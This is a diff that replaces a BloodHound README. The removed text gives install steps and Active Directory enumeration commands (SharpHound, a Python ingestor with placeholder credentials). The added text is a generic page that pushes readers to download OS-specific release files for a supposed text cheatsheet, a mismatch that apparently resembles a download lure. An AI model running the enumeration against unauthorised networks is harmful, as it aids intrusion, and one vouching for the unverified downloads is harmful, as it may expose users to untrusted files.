@@ -1,180 +1,63 @@
-# BloodHound Cheatsheet
-
-> A quick and clear guide for installing, using, and understanding the BloodHound Cheatsheet.
-
-<details>
-<summary><strong>📘 Table of Contents</strong></summary>
-
-* [Overview](#overview)
-* [Features](#features)
-* [Requirements](#requirements)
-* [Installation](#installation)
-* [How to Use](#how-to-use)
-
-  * [1. Running BloodHound](#1-running-bloodhound)
-  * [2. Uploading Data](#2-uploading-data)
-  * [3. Using the Cheatsheet](#3-using-the-cheatsheet)
-* [Tips](#tips)
-* [Disclaimer](#disclaimer)
-
-</details>
-
----
-
-## Overview
-
-The **BloodHound Cheatsheet** is a structured reference that helps users quickly look up common BloodHound queries, key attack paths, and common analysis patterns. It acts as a companion to the BloodHound tool, helping beginners and advanced users speed up their Active Directory enumeration workflow.
-
----
-
-## Features
-
-* Ready-made queries for common AD attack paths
-* Clear explanations to help understand each query
-* Organized categories for easier navigation
-* Works offline as a static reference
-
----
-
-## Requirements
-
-Before using the cheatsheet, make sure you have:
-
-* **BloodHound** installed
-* **Neo4j** running
-* Any **collection method** prepared (e.g., SharpHound, Python ingestors)
-
----
-
-## Installation
-
-Here is a clear guide for installing **BloodHound** from scratch on a fresh system.
-
-### **1. Install Neo4j (Required Database for BloodHound)**
-
-1. Download Neo4j Community Edition from the official site.
-2. Install it on your system.
-3. Run Neo4j:
-
-```bash
-neo4j console
-```
-
-4. Open your browser and go to:
-
-```
-http://localhost:7474
-```
-
-5. Set a new password when prompted.
-
-### **2. Install BloodHound**
-
-You can install BloodHound by downloading the latest release.
-
-**For Linux:**
-
-```bash
-sudo apt update
-sudo apt install bloodhound
-```
-
-**For Windows / Manual Download:**
-
-1. Go to the BloodHound GitHub release page.
-2. Download the latest BloodHound ZIP.
-3. Extract it.
-4. Run:
-
-```
-BloodHound.exe
-```
-
-### **3. Install a Data Collector (SharpHound / Python Ingestor)**
-
-#### **Windows (SharpHound.exe)**
-
-1. Download SharpHound from the BloodHound repository.
-2. Place it on the target machine.
-
-Run it:
-
-```bash
-SharpHound.exe -c All
-```
-
-#### **Linux (Python ingestor)**
-
-```bash
-pip install bloodhound
-python3 bloodhound.py -d domain.local -u user -p pass --zip
-```
-
----
-
-## How to Use
-
-### 1. Running BloodHound
-
-1. Start Neo4j:
-
-```bash
-neo4j console
-```
-
-2. Open BloodHound:
-
-```bash
-bloodhound
-```
-
-3. Log in using your Neo4j username and password.
-
-### 2. Uploading Data
-
-Collect data using SharpHound:
-
-```bash
-SharpHound.exe -c All
-```
-
-Or the Python ingestor:
-
-```bash
-python3 bloodhound.py -d domain.local -u user -p pass --zip
-```
-
-Then upload the ZIP file into BloodHound.
-
-### 3. Using the Cheatsheet
-
-Inside this repository, open:
-
-[cheatsheet/queries.md](cheatsheet/queries.md)
-
-This file contains:
-
-* Common queries
-* Privilege escalation paths
-* Lateral movement helpers
-* Interpretation notes
-
-You can copy any query and paste it directly into the **BloodHound Query Bar**.
-
----
-
-## Tips
-
-* Always validate your attack path; BloodHound sometimes suggests paths that need extra checks.
-* Update your SharpHound version to avoid inaccurate edges.
-* Combine the cheatsheet with real-time AD enumeration for better accuracy.
-
----
-
-## Disclaimer
-
-This cheatsheet is for **educational and security auditing purposes only**. Use it responsibly and only on systems you have explicit permission to test.
-
----
-
-Enjoy exploring AD the smart way.
+# 🐾 bloodhound-cheatsheet - A Handy Guide for BloodHound Users
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/darkeye789/bloodhound-cheatsheet/releases)
+
+## 📚 Description
+Welcome to the bloodhound-cheatsheet! This clear and structured cheatsheet is designed for BloodHound users. It explains what BloodHound does, how to install it from scratch, and shows you how to run common Active Directory (AD) enumeration and analysis tasks. This guide is perfect for both beginners and professionals looking for a quick reference while mapping Active Directory attack paths.
+
+## 🚀 Getting Started
+To start using the bloodhound-cheatsheet, follow these simple steps to download and install the application.
+
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/darkeye789/bloodhound-cheatsheet/releases) to access the latest version of the cheatsheet.
+2. From the list of available downloads, choose the file that matches your operating system.
+3. Download the selected file by clicking on it. This may take a few moments depending on your internet speed.
+4. Once the download is complete, locate the file in your computer's download folder.
+5. Open the file. If it’s a ZIP or similar file, you may need to extract it first. Right-click and select "Extract All" or use any extraction tool you have.
+6. Now you can comfortably view the cheatsheet. Open it with any text editor, browser, or PDF viewer that you prefer.
+
+## 🌐 System Requirements
+- **Operating System:** Compatible with Windows 10 and later versions, macOS Mojave or later, and recent Linux distributions.
+- **Memory:** Minimum of 2GB RAM recommended.
+- **Storage:** At least 100MB of free disk space.
+- **Software:** A web browser for viewing the cheatsheet; Adobe Reader or any PDF viewer if in PDF format.
+
+## 📖 What You Will Find
+In bloodhound-cheatsheet, you will discover:
+- A comprehensive introduction to BloodHound.
+- Step-by-step installation instructions that are easy to follow.
+- An overview of common commands and how to execute them effectively.
+- Detailed explanations of AD enumeration techniques.
+- Tips on analyzing Active Directory paths for better security management.
+
+## 📘 Common Tasks
+Here are a few key tasks you can perform with BloodHound:
+- Discovering relationships and permissions in Active Directory.
+- Identifying attack paths that can be exploited.
+- Mapping user and group permissions.
+- Running queries to extract meaningful data about your environment.
+
+## 🔧 Troubleshooting
+If you run into issues while downloading or opening the cheatsheet:
+- Ensure your internet connection is stable.
+- Check that you are using a supported operating system.
+- Make sure any necessary software (like a PDF viewer) is installed and up-to-date.
+
+## 💡 Tips for Beginners
+- Start with the introduction section to understand how BloodHound works.
+- Familiarize yourself with the commands by practicing in a safe environment.
+- Consult the community forums or resources for additional help and examples.
+
+## 💻 Additional Resources
+If you wish to delve deeper into BloodHound or conduct further research, consider the following topics and keywords:
+- Active Directory
+- AD Attack Paths
+- AD Enumeration
+- BloodHound
+- Cybersecurity best practices
+- Penetration testing strategies
+
+## 🌟 Stay Updated
+Make sure to check back on the [Releases page](https://github.com/darkeye789/bloodhound-cheatsheet/releases) often for new updates and features as they are released.
+
+Thank you for using bloodhound-cheatsheet! Happy exploring!
